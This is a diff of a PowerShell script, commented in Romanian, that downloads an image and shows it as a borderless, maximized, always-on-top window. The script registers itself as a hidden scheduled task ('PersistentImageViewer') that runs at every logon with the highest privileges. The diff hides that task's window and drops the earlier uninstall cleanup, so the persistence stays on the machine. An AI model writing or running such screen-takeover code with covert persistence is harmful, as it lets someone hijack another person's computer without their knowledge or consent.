@@ -1,10 +1,14 @@
-# Configurații
+# Configurare URL pentru imagine
 $imageURL = "https://github.com/diezul/x/blob/5b61198a4bfd1bc5a199713e3a8c0d18293c30e5/1.png"
-$tempImagePath = "$env:TEMP\cdr.jpg"
-$adminPassword = "cdr"  # Parola de administrator pentru închiderea programului
+$tempImagePath = "$env:TEMP\cdr.png"
 
-# Descărcarea imaginii
-Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath
+# Descărcare imagine
+try {
+    Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
+} catch {
+    Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
+    exit
+}
 
 # Funcție pentru afișarea imaginii pe tot ecranul
 function Show-FullScreenImage {
@@ -15,69 +19,40 @@ function Show-FullScreenImage {
     $form.WindowState = 'Maximized'
     $form.FormBorderStyle = 'None'
     $form.TopMost = $true
-    $form.KeyPreview = $true
 
-    $img = [System.Drawing.Image]::FromFile($tempImagePath)
+    try {
+        $img = [System.Drawing.Image]::FromFile($tempImagePath)
+    } catch {
+        Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
+        exit
+    }
+
     $pictureBox = New-Object System.Windows.Forms.PictureBox
     $pictureBox.Image = $img
     $pictureBox.Dock = 'Fill'
     $pictureBox.SizeMode = 'StretchImage'
     $form.Controls.Add($pictureBox)
 
-    $global:exitFlag = $false
-    $form.Add_KeyDown({
-        param($sender, $eventArgs)
-        $global:keySequence += $eventArgs.KeyCode.ToString()
-        if ($global:keySequence -like "*C*D*R") {
-            $password = Read-Host "Introduceți parola pentru închidere"
-            if ($password -eq $adminPassword) {
-                $global:exitFlag = $true
-                $form.Close()
-            } else {
-                Write-Host "Parolă incorectă!"
-                $global:keySequence = ""
-            }
-        }
-    })
-
-    while (-not $global:exitFlag) {
-        Start-Sleep -Milliseconds 100
-    }
-
-    $form.Close()
-}
-
-# Funcție pentru a verifica procesul
-function Monitor-Process {
-    while ($true) {
-        if (-not (Get-Process -Id $pid -ErrorAction SilentlyContinue)) {
-            Start-Process powershell -ArgumentList "-File `"$MyInvocation.MyCommand.Path`""
+    $form.KeyDown += {
+        if ($_ -and $_.KeyCode -eq 'Escape') {
             exit
         }
-        Start-Sleep -Seconds 1
     }
+
+    $form.Add_Shown({ $form.Activate() })
+    $form.ShowDialog()
 }
 
-# Funcție pentru setarea persistenței
+# Asigură persistența și execuția
 function Set-Startup {
     $scriptPath = $MyInvocation.MyCommand.Path
     $taskName = "PersistentImageViewer"
 
-    # Adaugă o sarcină în Task Scheduler
-    schtasks /create /tn $taskName /tr "powershell.exe -File '$scriptPath'" /sc onlogon /rl highest /f
+    schtasks /create /tn $taskName /tr "powershell.exe -WindowStyle Hidden -File '$scriptPath'" /sc onlogon /rl highest /f | Out-Null
 }
 
-# Activarea persistenței
+# Setează aplicația să ruleze la startup
 Set-Startup
 
-# Lansare monitorizare secundară
-Start-Job -ScriptBlock { Monitor-Process }
-
-# Afișarea imaginii
+# Afișează imaginea
 Show-FullScreenImage
-
-# Curățare după dezactivare completă
-if ($global:exitFlag) {
-    schtasks /delete /tn "PersistentImageViewer" /f
-    Write-Host "Aplicația a fost dezactivată complet."
-}
